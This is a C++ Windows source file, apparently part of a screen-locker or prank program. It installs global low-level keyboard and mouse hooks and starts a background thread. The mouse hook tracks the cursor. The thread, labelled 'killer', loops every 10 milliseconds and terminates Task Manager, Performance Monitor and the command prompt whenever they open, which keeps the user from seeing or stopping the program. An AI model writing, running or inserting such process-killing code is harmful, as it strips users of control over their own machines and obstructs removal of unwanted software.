#include "inputhook.h"
#include "renderer.h"

#include <Windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <psapi.h>

int mouseX = 0;
int mouseY = 0;

HHOOK hKeyboardHook;
HHOOK hMouseHook;

// https://stackoverflow.com/a/29745310/9642458
__declspec(dllexport) LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
    /*if (nCode == HC_ACTION)
    {
        switch (wParam)
        {
        case WM_KEYUP:
        {
            // Get hook struct
            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
            if (p->vkCode == VK_SPACE)
            {
                trap = ~trap;
            }
        }
        break;
        }
    }*/

    //return 1; // Trap keyboard inputs
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam); // Allow windows to process keyboard input
}

LRESULT WINAPI MouseEvent(int nCode, WPARAM wParam, LPARAM lParam) {
    MSLLHOOKSTRUCT* pMouseStruct = (MSLLHOOKSTRUCT*)lParam; // WH_MOUSE_LL struct
    /*
    nCode, this parameters will determine how to process a message
    This callback in this case only have information when it is 0 (HC_ACTION): wParam and lParam contain info

    wParam is about WINDOWS MESSAGE, in this case MOUSE messages.
    lParam is information contained in the structure MSLLHOOKSTRUCT
    */

    if (nCode == 0) { // we have information in wParam/lParam ? If yes, let's check it:
        if (pMouseStruct != NULL) { // Mouse struct contain information?			
            //printf_s("Mouse Coordinates: x = %i | y = %i \n", pMouseStruct->pt.x, pMouseStruct->pt.y);
            mouseX = pMouseStruct->pt.x;
            mouseY = h - pMouseStruct->pt.y;
        }

        /*switch (wParam) {

        case WM_MOUSEMOVE:
            return CallNextHookEx(hMouseHook, nCode, wParam, lParam);

        default: 
            return 1;

        //case WM_LBUTTONUP: {
            //printf_s("LEFT CLICK UP\n");
        //}break;
        //case WM_LBUTTONDOWN: {
            //printf_s("LEFT CLICK DOWN\n");
        //}break;

        }*/

    }

    /*
    Every time that the nCode is less than 0 we need to CallNextHookEx:
    -> Pass to the next hook
         MSDN: Calling CallNextHookEx is optional, but it is highly recommended;
         otherwise, other applications that have installed hooks will not receive hook notifications and may behave incorrectly as a result.
    */
    //return 1; // Trap keyboard inputs
    return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
}

// REALLY NOT-PERFORMANT
DWORD WINAPI killer(LPVOID lpParm)
{
    while (true)
    {
        PROCESSENTRY32 entry;
        entry.dwSize = sizeof(PROCESSENTRY32);

        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);

        if (!Process32First(snapshot, &entry))
        {
            CloseHandle(snapshot);
            continue;
        }

        do
        {
            if (!_tcsicmp(entry.szExeFile, _T("taskmgr.exe")) || !_tcsicmp(entry.szExeFile, _T("perfmon.exe")) || !_tcsicmp(entry.szExeFile, _T("cmd.exe")))
            {
                //Close task manager
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID); //Open Process to terminate
                TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
            }
        } while (Process32Next(snapshot, &entry));

        CloseHandle(snapshot);

        Sleep(10);
    }
    return 0;
}

DWORD WINAPI hook(LPVOID lpParm)
{
    HINSTANCE hInstance = GetModuleHandle(NULL);
    if (!hInstance) hInstance = LoadLibrary((LPCSTR)lpParm);
    if (!hInstance) return 1;

    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardEvent, hInstance, NULL);
    hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)MouseEvent, hInstance, NULL);
    MSG message;
    while (GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
    UnhookWindowsHookEx(hKeyboardHook);
    UnhookWindowsHookEx(hMouseHook);
    return 0;
}

void HookInput()
{
	HANDLE hThreadHook = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)hook, 0, 0, 0);
    HANDLE hThreadKill = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)killer, 0, 0, 0);
}